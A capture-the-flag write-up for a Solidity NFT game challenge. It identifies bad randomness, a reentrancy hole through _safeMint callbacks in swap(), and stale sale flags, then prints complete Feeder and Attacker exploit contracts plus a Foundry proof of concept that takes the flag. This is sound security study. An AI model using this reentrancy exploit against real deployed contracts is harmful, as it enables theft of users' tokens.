# Game

## Challenge

The Game.sol is deployed with the flagHolder holding an apparently unbeatable deck with perfect Mons.

Your mission is to obtain the flag: i.e. game.flagHolder() should return an address that you control


## Solution

### Setup
In the original Version, the contract was deployed on Rinkeby and you should solve the challenge by forking Rinkeby. Unfortunately, Rinkeby is not really in use anymore so I decided on developing my setup for the challenge using foundry. It can be found in the repo as POC_raw.sol. 

### Analysis

#### Bad Randomness
The first vulnerability I found is that you can exactly predict the stats of your mon, as the randomness is only derived from block.number and some other values that we know. So we can just keep increasing the block.number by waiting until we get the perfect values, which we can calculate ourselves.

#### Inefficient indexInDeck()
The loop in indexInDeck doesn't break when it finds the id inside the decks array. This is not that much of a problem as there are only 3 indexes. The bigger problem is, that in case of finding nothing it returns 0, which could also be a valid index.

#### ForSale not removed
The true value in forSale() stays set after the swap and doesn't get reset to 0. So one has to always trade his traded card after swapping, as this can't even be reset manually.

#### Reentrancy in swap()
There is a possible reentrancy attack introduced by the _safeMint() functions in the swap() function. Both _safeMint() functions allow for reentrancy, as there is no reentrancyGuard deployed. 


### Attacks
At first, I thought just generating 3 supermons would be enough to solve this chal. Unfortunately in this case you still lose all the fights, as you need to have a higher speed value. 

My next idea was to exploit the potential reentrancy in _safeMint() to loan myself 6 NFTS and be able to just lose 3 and still have a bigger balance than the other one. The "flash loan" exploiting the 2 _safeTransfers did actually work pretty well. Unfortunately, I ran into the issue that my first 3 NFTs were burned during the fight and I was not able to return the first 3 I used to swap for the following ones.

Further improving upon my reentrancy plan I had the idea, that as the forSale value stays set after the fight, we could swap our newly receive NFTs with the 0x0 address to get the right ids back using the commands:
```solidity
game.swap(address(0), 12, 3);
game.swap(address(0), 13, 4);
game.swap(address(0), 14, 5);
```
Unfortunately, this also didn't work as ERC721 includes an assert that reverts in case of a transfer to the 0 address.

### Exploit
Finally, I got an idea of how to solve the challenge. I could exploit the reentrancy between both safeMint functions, to transfer all my NFTs out (knowing that I will get one back for them later), and then as soon as all 3 are gone call join() again to get 3 new ones. As 3 would still not be enough, because the win function only changes if we have more NFTs in our balance than the flag holder (3 get destroyed during the fight so we then also have 3 left), we need to do this 2 times to have more left, even after losing 3. 

To exploit this I developed 2 contracts. A feeder account is used for storing our NFTs while we want to get new ones and an Attacker contract to facilitate the whole attack and claim the flag in the end.

Feeder:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "./Game.sol";
import "./Attacker.sol";

contract Feeder is IERC721Receiver
{
    Game public game;
    Attacker atk; 
    constructor(address _game)
    {
        atk = Attacker(msg.sender);

        game = Game(_game);
        game.join();

        if (game.totalSupply() == 9)
        {
            game.putUpForSale(6);
            game.putUpForSale(7);
            game.putUpForSale(8);
        }
        else if (game.totalSupply() == 12)
        {
            game.putUpForSale(9);
            game.putUpForSale(10);
            game.putUpForSale(11);
        }
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4)
    {
        atk.getNext();
        return bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"));
    }
}
```


Attacker:
```solidity 
// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "./Game.sol";
import "./Feeder.sol";

contract Attacker is IERC721Receiver
{
    Game public game;
    Feeder feed1;
    Feeder feed2;
    uint256 nfts_sent = 0;

    constructor(address _game)
    {
        game = Game(_game);

        game.join();

        feed1 = new Feeder(_game);
        feed2 = new Feeder(_game);
    }

    function getEmAll() public
    {
        game.swap(address(feed1), 3, 6);
    }

    function getNext() public
    {
        nfts_sent++;
        if(nfts_sent == 3)
        {
            game.join();
        }
        else if (nfts_sent == 6)
        {
            game.join();
        }

        if (nfts_sent < 3)
        {
            game.swap(address(feed1), 3+nfts_sent, 6+nfts_sent);
        } 
        else if (nfts_sent < 6)
        {
            game.swap(address(feed2), 9+nfts_sent, 6+nfts_sent);
        }
    }

    function fightEmAll() public
    {
        game.fight();
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4)
    {
        return bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"));
    }
}
```

### Finished POC


```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../lib/forge-std/src/Test.sol";
import "../src/Game.sol";
import "../src/Attacker.sol";

contract Hack is Test {
    Game game;

    address bigBoss = makeAddr("bigBoss");
    address hacker = makeAddr("hacker");
    address hacker2 = makeAddr("hacker2");
    uint blockGasLimit = 120000;

    function setUp() public {
        //Deal some money to everyone
        vm.deal(bigBoss, 1 ether);
        vm.deal(hacker, 1 ether);

        vm.startPrank(bigBoss);
        //Deploy the game contract
        game = new Game();
        vm.stopPrank();
    }

    function test_attack() public {
        vm.startPrank(hacker);

        Attacker atk = new Attacker(address(game));

        //get 9 mons
        atk.getEmAll();

        //fight to make the atk contract the flag holder
        atk.fightEmAll();

        vm.stopPrank();

        assertEq(game.flagHolder(), address(atk));
    }
}
```